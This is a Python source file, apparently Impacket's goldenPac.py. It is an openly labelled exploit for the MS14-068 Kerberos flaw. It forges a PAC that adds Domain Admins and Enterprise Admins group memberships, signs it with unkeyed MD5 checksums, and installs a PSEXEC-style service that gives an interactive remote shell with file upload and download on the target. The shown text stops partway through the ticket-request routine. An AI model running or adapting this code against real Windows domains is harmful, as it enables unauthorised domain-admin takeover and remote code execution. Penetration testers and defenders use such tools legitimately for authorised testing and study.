#!/usr/bin/python
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author: Alberto Solino (@agsolino)
#
# Description:
#   MS14-068 Exploit. Kudos to @BiDOrD for pulling it up first! 
#   Well done :).
#   This one also established a SMBConnection and PSEXEcs the 
#   target.
#   A few important things:
#   1) you must use the domain FQDN or use -dc-ip switch
#   2) target must be a FQDN as well and matching the target's NetBIOS 
#   3) Just RC4 at the moment - DONE (aes256 added)
#   4) It won't work on Kerberos-only Domains (but can be fixed)
#   5) Use WMIEXEC approach instead
#
#   E.G:
#       python goldenPac domain.net/normaluser@domain-host
#       the password will be asked, or
#
#       python goldenPac.py domain.net/normaluser:mypwd@domain-host
#
#       if domain.net and/or domain-host do not resolve, add them
#       to the hosts file or use the -dc-ip and -target-ip parameters
#

import random
import string
import logging
from binascii import unhexlify

from impacket.examples import logger
from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRUniConformantArray, NDRPOINTER
from impacket.dcerpc.v5.dtypes import ULONG, RPC_SID, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT, MAXIMUM_ALLOWED
from impacket.dcerpc.v5.nrpc import USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY, PRPC_UNICODE_STRING_ARRAY, MSRPC_UUID_NRPC, hDsrGetDcNameEx
from impacket.dcerpc.v5.rpcrt import TypeSerialization1, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, hLsarOpenPolicy2, POLICY_LOOKUP_NAMES
from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS
from impacket.dcerpc.v5 import epm
from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, \
    DRS_EXTENSIONS_INT, DRS_EXT_GETCHGREQ_V6, DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREQ_V8, DRS_EXT_STRONG_ENCRYPTION, \
    NULLGUID, DRS_EXT_RECYCLE_BIN
from impacket.structure import Structure

################################################################################
# CONSTANTS
################################################################################
# From http://msdn.microsoft.com/en-us/library/aa302203.aspx#msdn_pac_credentials
# and http://diswww.mit.edu/menelaus.mit.edu/cvs-krb5/25862
PAC_LOGON_INFO       = 1
PAC_CREDENTIALS_INFO = 2
PAC_SERVER_CHECKSUM  = 6
PAC_PRIVSVR_CHECKSUM = 7
PAC_CLIENT_INFO_TYPE = 10
PAC_DELEGATION_INFO  = 11
PAC_UPN_DNS_INFO     = 12

################################################################################
# STRUCTURES
################################################################################

PISID = PRPC_SID

# 2.2.1 KERB_SID_AND_ATTRIBUTES
class KERB_SID_AND_ATTRIBUTES(NDRSTRUCT):
    structure = (
        ('Sid', PISID),
        ('Attributes', ULONG),
    )

class KERB_SID_AND_ATTRIBUTES_ARRAY(NDRUniConformantArray):
    item = KERB_SID_AND_ATTRIBUTES

class PKERB_SID_AND_ATTRIBUTES_ARRAY(NDRPOINTER):
    referent = (
        ('Data', KERB_SID_AND_ATTRIBUTES_ARRAY),
    )

# 2.2.2 GROUP_MEMBERSHIP
from impacket.dcerpc.v5.nrpc import PGROUP_MEMBERSHIP_ARRAY

# 2.2.3 DOMAIN_GROUP_MEMBERSHIP
class DOMAIN_GROUP_MEMBERSHIP(NDRSTRUCT):
    structure = (
        ('DomainId', PISID),
        ('GroupCount', ULONG),
        ('GroupIds', PGROUP_MEMBERSHIP_ARRAY),
    )

class DOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRUniConformantArray):
    item = DOMAIN_GROUP_MEMBERSHIP

class PDOMAIN_GROUP_MEMBERSHIP_ARRAY(NDRPOINTER):
    referent = (
        ('Data', KERB_SID_AND_ATTRIBUTES_ARRAY),
    )

# 2.3 PACTYPE
class PACTYPE(Structure):
    structure = (
        ('cBuffers', '<L=0'),
        ('Version', '<L=0'),
        ('Buffers', ':'), 
    )

# 2.4 PAC_INFO_BUFFER
class PAC_INFO_BUFFER(Structure):
    structure = (
        ('ulType', '<L=0'),
        ('cbBufferSize', '<L=0'),
        ('Offset', '<Q=0'), 
    )

# 2.5 KERB_VALIDATION_INFO
class KERB_VALIDATION_INFO(NDRSTRUCT):
    structure = (
        ('LogonTime', FILETIME),
        ('LogoffTime', FILETIME),
        ('KickOffTime', FILETIME),
        ('PasswordLastSet', FILETIME),
        ('PasswordCanChange', FILETIME),
        ('PasswordMustChange', FILETIME),
        ('EffectiveName', RPC_UNICODE_STRING),
        ('FullName', RPC_UNICODE_STRING),
        ('LogonScript', RPC_UNICODE_STRING),
        ('ProfilePath', RPC_UNICODE_STRING),
        ('HomeDirectory', RPC_UNICODE_STRING),
        ('HomeDirectoryDrive', RPC_UNICODE_STRING),
        ('LogonCount', USHORT),
        ('BadPasswordCount', USHORT),
        ('UserId', ULONG),
        ('PrimaryGroupId', ULONG),
        ('GroupCount', ULONG),
        ('GroupIds', PGROUP_MEMBERSHIP_ARRAY),
        ('UserFlags', ULONG),
        ('UserSessionKey', USER_SESSION_KEY),
        ('LogonServer', RPC_UNICODE_STRING),
        ('LogonDomainName', RPC_UNICODE_STRING),
        ('LogonDomainId', PRPC_SID),

        # Also called Reserved1
        ('LMKey', CHAR_FIXED_8_ARRAY),

        ('UserAccountControl', ULONG),
        ('SubAuthStatus', ULONG),
        ('LastSuccessfulILogon', FILETIME),
        ('LastFailedILogon', FILETIME),
        ('FailedILogonCount', ULONG),
        ('Reserved3', ULONG),

        ('SidCount', ULONG),
        #('ExtraSids', PNETLOGON_SID_AND_ATTRIBUTES_ARRAY),
        ('ExtraSids', PKERB_SID_AND_ATTRIBUTES_ARRAY),
        ('ResourceGroupDomainSid', PISID),
        ('ResourceGroupCount', ULONG),
        ('ResourceGroupIds', PGROUP_MEMBERSHIP_ARRAY),
    )

class PKERB_VALIDATION_INFO(NDRPOINTER):
    referent = (
        ('Data', KERB_VALIDATION_INFO),
    )

# 2.6.1 PAC_CREDENTIAL_INFO
class PAC_CREDENTIAL_INFO(Structure):
    structure = (
        ('Version', '<L=0'),
        ('EncryptionType', '<L=0'),
        ('SerializedData', ':'), 
    )

# 2.6.3 SECPKG_SUPPLEMENTAL_CRED
class SECPKG_SUPPLEMENTAL_CRED(NDRSTRUCT):
    structure = (
        ('PackageName', RPC_UNICODE_STRING),
        ('CredentialSize', ULONG),
        ('Credentials', PUCHAR_ARRAY),
    )

class SECPKG_SUPPLEMENTAL_CRED_ARRAY(NDRUniConformantArray):
    item = SECPKG_SUPPLEMENTAL_CRED

# 2.6.2 PAC_CREDENTIAL_DATA
class PAC_CREDENTIAL_DATA(NDRSTRUCT):
    structure = (
        ('CredentialCount', ULONG),
        ('Credentials', SECPKG_SUPPLEMENTAL_CRED_ARRAY),
    )

# 2.6.4 NTLM_SUPPLEMENTAL_CREDENTIAL
class NTLM_SUPPLEMENTAL_CREDENTIAL(NDRSTRUCT):
    structure = (
        ('Version', ULONG),
        ('Flags', ULONG),
        ('LmPassword', '16s=""'),
        ('NtPassword', '16s=""'),
    )

# 2.7 PAC_CLIENT_INFO
class PAC_CLIENT_INFO(Structure):
    structure = (
        ('ClientId', '<Q=0'),
        ('NameLength', '<H=0'),
        ('_Name', '_-Name', 'self["NameLength"]'), 
        ('Name', ':'), 
    )

# 2.8 PAC_SIGNATURE_DATA
class PAC_SIGNATURE_DATA(Structure):
    structure = (
        ('SignatureType', '<L=0'),
        ('Signature', ':'),
    )

# 2.9 Constrained Delegation Information - S4U_DELEGATION_INFO
class S4U_DELEGATION_INFO(NDRSTRUCT):
    structure = (
        ('S4U2proxyTarget', RPC_UNICODE_STRING),
        ('TransitedListSize', ULONG),
        ('S4UTransitedServices', PRPC_UNICODE_STRING_ARRAY ),
    )

# 2.10 UPN_DNS_INFO
class UPN_DNS_INFO(Structure):
    structure = (
        ('UpnLength', '<H=0'),
        ('UpnOffset', '<H=0'),
        ('DnsDomainNameLength', '<H=0'),
        ('DnsDomainNameOffset', '<H=0'),
        ('Flags', '<L=0'),
    )

# 2.11 PAC_CLIENT_CLAIMS_INFO
class PAC_CLIENT_CLAIMS_INFO(Structure):
    structure = (
        ('Claims', ':'),
    )

# 2.12 PAC_DEVICE_INFO
class PAC_DEVICE_INFO(NDRSTRUCT):
    structure = (
        ('UserId', ULONG),
        ('PrimaryGroupId', ULONG),
        ('AccountDomainId', PISID ),
        ('AccountGroupCount', ULONG ),
        ('AccountGroupIds', PGROUP_MEMBERSHIP_ARRAY ),
        ('SidCount', ULONG ),
        ('ExtraSids', PKERB_SID_AND_ATTRIBUTES_ARRAY ),
        ('DomainGroupCount', ULONG ),
        ('DomainGroup', PDOMAIN_GROUP_MEMBERSHIP_ARRAY ),
    )

# 2.13 PAC_DEVICE_CLAIMS_INFO
class PAC_DEVICE_CLAIMS_INFO(Structure):
    structure = (
        ('Claims', ':'),
    )

################################################################################
# HELPER FUNCTIONS
################################################################################

import os
import cmd
import time
from impacket.smbconnection import SMBConnection, smb
from impacket.structure import Structure
from threading import Thread, Lock
from impacket.examples import remcomsvc, serviceinstall

class RemComMessage(Structure):
    structure = (
        ('Command','4096s=""'),
        ('WorkingDir','260s=""'),
        ('Priority','<L=0x20'),
        ('ProcessID','<L=0x01'),
        ('Machine','260s=""'),
        ('NoWait','<L=0'),
    )

class RemComResponse(Structure):
    structure = (
        ('ErrorCode','<L=0'),
        ('ReturnCode','<L=0'),
    )

RemComSTDOUT         = "RemCom_stdout"
RemComSTDIN          = "RemCom_stdin"
RemComSTDERR         = "RemCom_stderr"

lock = Lock()

class PSEXEC:
    def __init__(self, command, username, domain, smbConnection, TGS, copyFile):
        self.__username = username
        self.__command = command
        self.__path = None
        self.__domain = domain
        self.__exeFile = None
        self.__copyFile = copyFile
        self.__TGS = TGS
        self.__smbConnection = smbConnection

    def run(self, addr):
        rpctransport = transport.SMBTransport(addr, filename='/svcctl', smb_connection=self.__smbConnection)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except Exception, e:
            logging.critical(str(e))
            sys.exit(1)

        global dialect
        dialect = rpctransport.get_smb_connection().getDialect()

        try:
            unInstalled = False
            s = rpctransport.get_smb_connection()

            # We don't wanna deal with timeouts from now on.
            s.setTimeout(100000)
            if self.__exeFile is None:
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), remcomsvc.RemComSvc())
            else:
                try:
                    f = open(self.__exeFile)
                except Exception, e:
                    logging.critical(str(e))
                    sys.exit(1)
                installService = serviceinstall.ServiceInstall(rpctransport.get_smb_connection(), f)
    
            installService.install()

            if self.__exeFile is not None:
                f.close()

            # Check if we need to copy a file for execution
            if self.__copyFile is not None:
                installService.copy_file(self.__copyFile, installService.getShare(), os.path.basename(self.__copyFile))
                # And we change the command to be executed to this filename
                self.__command = os.path.basename(self.__copyFile) + ' ' + self.__command

            tid = s.connectTree('IPC$')
            fid_main = self.openPipe(s,tid,'\RemCom_communicaton',0x12019f)

            packet = RemComMessage()
            pid = os.getpid()

            packet['Machine'] = ''.join([random.choice(string.letters) for _ in range(4)])
            if self.__path is not None:
                packet['WorkingDir'] = self.__path
            packet['Command'] = self.__command
            packet['ProcessID'] = pid

            s.writeNamedPipe(tid, fid_main, str(packet))

            # Here we'll store the command we type so we don't print it back ;)
            # ( I know.. globals are nasty :P )
            global LastDataSent
            LastDataSent = ''

            # Create the pipes threads
            stdin_pipe  = RemoteStdInPipe(rpctransport,'\%s%s%d' % (RemComSTDIN ,packet['Machine'],packet['ProcessID']), smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS, installService.getShare() )
            stdin_pipe.start()
            stdout_pipe = RemoteStdOutPipe(rpctransport,'\%s%s%d' % (RemComSTDOUT,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
            stdout_pipe.start()
            stderr_pipe = RemoteStdErrPipe(rpctransport,'\%s%s%d' % (RemComSTDERR,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
            stderr_pipe.start()
            
            # And we stay here till the end
            ans = s.readNamedPipe(tid,fid_main,8)

            if len(ans):
               retCode = RemComResponse(ans)
               logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
            installService.uninstall()
            if self.__copyFile is not None:
                # We copied a file for execution, let's remove it
                s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            unInstalled = True
            sys.exit(retCode['ErrorCode'])

        except SystemExit:
            raise
        except:
            if unInstalled is False:
                installService.uninstall()
                if self.__copyFile is not None:
                    s.deleteFile(installService.getShare(), os.path.basename(self.__copyFile))
            sys.stdout.flush()
            sys.exit(1)

    def openPipe(self, s, tid, pipe, accessMask):
        pipeReady = False
        tries = 50
        while pipeReady is False and tries > 0:
            try:
                s.waitNamedPipe(tid,pipe)
                pipeReady = True
            except:
                tries -= 1
                time.sleep(2)
                pass

        if tries == 0:
            logging.critical('Pipe not ready, aborting')
            raise

        fid = s.openFile(tid,pipe,accessMask, creationOption = 0x40, fileAttributes = 0x80)

        return fid

class Pipes(Thread):
    def __init__(self, transport, pipe, permissions, TGS=None, share=None):
        Thread.__init__(self)
        self.server = 0
        self.transport = transport
        self.credentials = transport.get_credentials()
        self.tid = 0
        self.fid = 0
        self.share = share
        self.port = transport.get_dport()
        self.pipe = pipe
        self.permissions = permissions
        self.TGS = TGS
        self.daemon = True

    def connectPipe(self):
        try:
            lock.acquire()
            global dialect
            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
            user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
            self.server.login(user, passwd, domain, lm, nt)
            lock.release()
            self.tid = self.server.connectTree('IPC$') 

            self.server.waitNamedPipe(self.tid, self.pipe)
            self.fid = self.server.openFile(self.tid,self.pipe,self.permissions, creationOption = 0x40, fileAttributes = 0x80)
            self.server.setTimeout(1000000)
        except:
            logging.critical("Something wen't wrong connecting the pipes(%s), try again" % self.__class__)


class RemoteStdOutPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
            except:
                pass
            else:
                try:
                        global LastDataSent
                        if ans != LastDataSent:
                            sys.stdout.write(ans)
                            sys.stdout.flush()
                        else:
                            # Don't echo what I sent, and clear it up
                            LastDataSent = ''
                        # Just in case this got out of sync, i'm cleaning it up if there are more than 10 chars, 
                        # it will give false positives tho.. we should find a better way to handle this.
                        if LastDataSent > 10:
                            LastDataSent = ''
                except:
                    pass

class RemoteStdErrPipe(Pipes):
    def __init__(self, transport, pipe, permisssions):
        Pipes.__init__(self, transport, pipe, permisssions)

    def run(self):
        self.connectPipe()
        while True:
            try:
                ans = self.server.readFile(self.tid,self.fid, 0, 1024)
            except:
                pass
            else:
                try:
                    sys.stderr.write(str(ans))
                    sys.stderr.flush()
                except:
                    pass

class RemoteShell(cmd.Cmd):
    def __init__(self, server, port, credentials, tid, fid, TGS, share):
        cmd.Cmd.__init__(self, False)
        self.prompt = '\x08'
        self.server = server
        self.transferClient = None
        self.tid = tid
        self.fid = fid
        self.credentials = credentials
        self.share = share
        self.port = port
        self.TGS = TGS
        self.intro = '[!] Press help for extra shell commands'

    def connect_transferClient(self):
        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
        user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
        self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)

    def do_help(self, line):
        print """
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (%s)
 get {file}                 - downloads pathname RELATIVE to the connected share (%s) to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""" % (self.share, self.share)
        self.send_data('\r\n', False)

    def do_shell(self, s):
        os.system(s)
        self.send_data('\r\n')

    def do_get(self, src_path):
        try:
            if self.transferClient is None:
                self.connect_transferClient()

            import ntpath
            filename = ntpath.basename(src_path)
            fh = open(filename,'wb')
            logging.info("Downloading %s\%s" % (self.share, src_path))
            self.transferClient.getFile(self.share, src_path, fh.write)
            fh.close()
        except Exception, e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')
 
    def do_put(self, s):
        try:
            if self.transferClient is None:
                self.connect_transferClient()
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = '/'

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            f = dst_path + '/' + src_file
            pathname = string.replace(f,'/','\\')
            logging.info("Uploading %s to %s\%s" % (src_file, self.share, dst_path))
            self.transferClient.putFile(self.share, pathname, fh.read)
            fh.close()
        except Exception, e:
            logging.error(str(e))
            pass

        self.send_data('\r\n')


    def do_lcd(self, s):
        if s == '':
            print os.getcwd()
        else:
            try:
                os.chdir(s)
            except Exception, e:
                logging.error(str(e))
        self.send_data('\r\n')

    def emptyline(self):
        self.send_data('\r\n')
        return

    def default(self, line):
        self.send_data(line+'\r\n')

    def send_data(self, data, hideOutput = True):
        if hideOutput is True:
            global LastDataSent
            LastDataSent = data
        else:
            LastDataSent = ''
        self.server.writeFile(self.tid, self.fid, data)


class RemoteStdInPipe(Pipes):
    def __init__(self, transport, pipe, permisssions, TGS=None, share=None):
        Pipes.__init__(self, transport, pipe, permisssions, TGS, share)

    def run(self):
        self.connectPipe()
        shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
        shell.cmdloop()


class MS14_068:
    # 6.1.  Unkeyed Checksums
    # Vulnerable DCs are accepting at least these unkeyed checksum types
    CRC_32  = 1
    RSA_MD4 = 2
    RSA_MD5 = 7
    class VALIDATION_INFO(TypeSerialization1):
        structure = (
            ('Data', PKERB_VALIDATION_INFO),
        )

    def __init__(self, target, targetIp = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__rid = 0
        self.__lmhash = ''
        self.__nthash = ''
        self.__target = target
        self.__targetIp = targetIp
        self.__kdcHost = None
        self.__copyFile = copyFile
        self.__command = command
        self.__writeTGT = writeTGT
        self.__domainSid = ''
        self.__forestSid = None
        self.__domainControllers = list()
        self.__kdcHost = kdcHost

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')
            self.__lmhash = unhexlify(self.__lmhash)
            self.__nthash = unhexlify(self.__nthash)

    def getGoldenPAC(self, authTime):
        # Ok.. we need to build a PAC_TYPE with the following items

        # 1) KERB_VALIDATION_INFO
        aTime = timegm(strptime(str(authTime), '%Y%m%d%H%M%SZ'))

        unixTime = getFileTime(aTime)

        kerbdata = KERB_VALIDATION_INFO()

        kerbdata['LogonTime']['dwLowDateTime']           = unixTime & 0xffffffff
        kerbdata['LogonTime']['dwHighDateTime']          = unixTime >>32

        # LogoffTime: A FILETIME structure that contains the time the client's logon 
        # session should expire. If the session should not expire, this structure 
        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime 
        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as 
        # an indicator of when to warn the user that the allowed time is due to expire.
        kerbdata['LogoffTime']['dwLowDateTime']          = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime']         = 0x7FFFFFFF

        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user 
        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the 
        # client should not be logged off, this structure SHOULD have the dwHighDateTime 
        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF. 
        # The Kerberos service ticket end time is a replacement for KickOffTime. 
        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of 
        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator 
        # of when the client should be forcibly disconnected.
        kerbdata['KickOffTime']['dwLowDateTime']         = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime']        = 0x7FFFFFFF

        kerbdata['PasswordLastSet']['dwLowDateTime']     = 0
        kerbdata['PasswordLastSet']['dwHighDateTime']    = 0

        kerbdata['PasswordCanChange']['dwLowDateTime']   = 0
        kerbdata['PasswordCanChange']['dwHighDateTime']  = 0
        
        # PasswordMustChange: A FILETIME structure that contains the time at which
        # theclient's password expires. If the password will not expire, this 
        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the 
        # dwLowDateTime member set to 0xFFFFFFFF.
        kerbdata['PasswordMustChange']['dwLowDateTime']  = 0xFFFFFFFF
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['EffectiveName']      = self.__username
        kerbdata['FullName']           = ''
        kerbdata['LogonScript']        = ''
        kerbdata['ProfilePath']        = ''
        kerbdata['HomeDirectory']      = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount']         = 0
        kerbdata['BadPasswordCount']   = 0
        kerbdata['UserId']             = self.__rid
        kerbdata['PrimaryGroupId']     = 513
        
        # Our Golden Well-known groups! :)
        groups = (513, 512, 520, 518, 519)
        kerbdata['GroupCount']         = len(groups)

        for group in groups:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = group
            groupMembership['RelativeId'] = groupId
            groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)

        kerbdata['UserFlags']         = 0
        kerbdata['UserSessionKey']    = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['LogonServer']       = ''
        kerbdata['LogonDomainName']   = self.__domain
        kerbdata['LogonDomainId']     = self.__domainSid
        kerbdata['LMKey']             = '\x00\x00\x00\x00\x00\x00\x00\x00'
        kerbdata['UserAccountControl']= USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus']     = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime']  = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime']      = 0
        kerbdata['LastFailedILogon']['dwHighDateTime']     = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3']         = 0

        # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is 
        # asserted by an authentication authority based on proof of possession of client credentials.
        #extraSids = ('S-1-18-1',)
        if self.__forestSid is not None:
            extraSids = ('%s-%s' % (self.__forestSid, '519'),)
            kerbdata['SidCount']          = len(extraSids)
            kerbdata['UserFlags'] |= 0x20
        else:
            extraSids = ()
            kerbdata['SidCount']          = len(extraSids)
        
        for extraSid in extraSids:
            sidRecord = KERB_SID_AND_ATTRIBUTES()
            sid = RPC_SID()
            sid.fromCanonical(extraSid)
            sidRecord['Sid'] = sid
            sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['ExtraSids'].append(sidRecord)

        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL
            
        validationInfo = self.VALIDATION_INFO()
        validationInfo['Data'] = kerbdata

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('VALIDATION_INFO')
            validationInfo.dump()
            print ('\n')

        validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
        validationInfoAlignment = '\x00'*(((len(validationInfoBlob)+7)/8*8)-len(validationInfoBlob))

        # 2) PAC_CLIENT_INFO
        pacClientInfo = PAC_CLIENT_INFO()
        pacClientInfo['ClientId'] = unixTime
        try:
            name = self.__username.encode('utf-16le')
        except UnicodeDecodeError:
            import sys
            name = self.__username.decode(sys.getfilesystemencoding()).encode('utf-16le')
        pacClientInfo['NameLength'] = len(name)
        pacClientInfo['Name'] = name
        pacClientInfoBlob = str(pacClientInfo)
        pacClientInfoAlignment = '\x00'*(((len(pacClientInfoBlob)+7)/8*8)-len(pacClientInfoBlob))

        # 3) PAC_SERVER_CHECKSUM/PAC_SIGNATURE_DATA
        serverChecksum = PAC_SIGNATURE_DATA()

        # If you wanna do CRC32, uncomment this
        #serverChecksum['SignatureType'] = self.CRC_32
        #serverChecksum['Signature'] = '\x00'*4

        # If you wanna do MD4, uncomment this
        #serverChecksum['SignatureType'] = self.RSA_MD4
        #serverChecksum['Signature'] = '\x00'*16

        # If you wanna do MD5, uncomment this
        serverChecksum['SignatureType'] = self.RSA_MD5
        serverChecksum['Signature'] = '\x00'*16

        serverChecksumBlob = str(serverChecksum)
        serverChecksumAlignment = '\x00'*(((len(serverChecksumBlob)+7)/8*8)-len(serverChecksumBlob))

        # 4) PAC_PRIVSVR_CHECKSUM/PAC_SIGNATURE_DATA
        privSvrChecksum = PAC_SIGNATURE_DATA()

        # If you wanna do CRC32, uncomment this
        #privSvrChecksum['SignatureType'] = self.CRC_32
        #privSvrChecksum['Signature'] = '\x00'*4

        # If you wanna do MD4, uncomment this
        #privSvrChecksum['SignatureType'] = self.RSA_MD4
        #privSvrChecksum['Signature'] = '\x00'*16

        # If you wanna do MD5, uncomment this
        privSvrChecksum['SignatureType'] = self.RSA_MD5
        privSvrChecksum['Signature'] = '\x00'*16

        privSvrChecksumBlob = str(privSvrChecksum)
        privSvrChecksumAlignment = '\x00'*(((len(privSvrChecksumBlob)+7)/8*8)-len(privSvrChecksumBlob))

        # The offset are set from the beginning of the PAC_TYPE
        # [MS-PAC] 2.4 PAC_INFO_BUFFER
        offsetData = 8 + len(str(PAC_INFO_BUFFER()))*4

        # Let's build the PAC_INFO_BUFFER for each one of the elements
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] =  len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = (offsetData+validationInfoIB['cbBufferSize'] + 7) /8 *8

        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = (offsetData+pacClientInfoIB['cbBufferSize'] + 7) /8 *8

        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = (offsetData+serverChecksumIB['cbBufferSize'] + 7) /8 *8

        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8

        # Building the PAC_TYPE as specified in [MS-PAC]
        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(pacClientInfo) + pacClientInfoAlignment
        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment

        pacType = PACTYPE()
        pacType['cBuffers'] = 4
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail

        blobToChecksum = str(pacType)

        # If you want to do CRC-32, ucomment this
        #serverChecksum['Signature'] = struct.pack('<L', (binascii.crc32(blobToChecksum, 0xffffffff) ^ 0xffffffff) & 0xffffffff)
        #privSvrChecksum['Signature'] =  struct.pack('<L', (binascii.crc32(serverChecksum['Signature'], 0xffffffff) ^ 0xffffffff) & 0xffffffff)

        # If you want to do MD4, ucomment this
        #serverChecksum['Signature'] = MD4.new(blobToChecksum).digest()
        #privSvrChecksum['Signature'] =  MD4.new(serverChecksum['Signature']).digest()

        # If you want to do MD5, ucomment this
        serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
        privSvrChecksum['Signature'] = MD5.new(serverChecksum['Signature']).digest() 

        buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail

        authorizationData = AuthorizationData()
        authorizationData[0] = None
        authorizationData[0]['ad-type'] = int(constants.AuthorizationDataType.AD_WIN2K_PAC.value)
        authorizationData[0]['ad-data'] = str(pacType)
        return encoder.encode(authorizationData)

    def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher, sessionKey, authTime):
        # Get out Golden PAC
        goldenPAC = self.getGoldenPAC(authTime)

        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]

        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        # Now put the goldenPac inside the AuthorizationData AD_IF_RELEVANT
        ifRelevant = AD_IF_RELEVANT()
        ifRelevant[0] = None
        ifRelevant[0]['ad-type'] = int(constants.AuthorizationDataType.AD_IF_RELEVANT.value)
        ifRelevant[0]['ad-data'] = goldenPAC

        encodedIfRelevant = encoder.encode(ifRelevant)

        # Key Usage 4
        # TGS-REQ KDC-REQ-BODY AuthorizationData, encrypted with
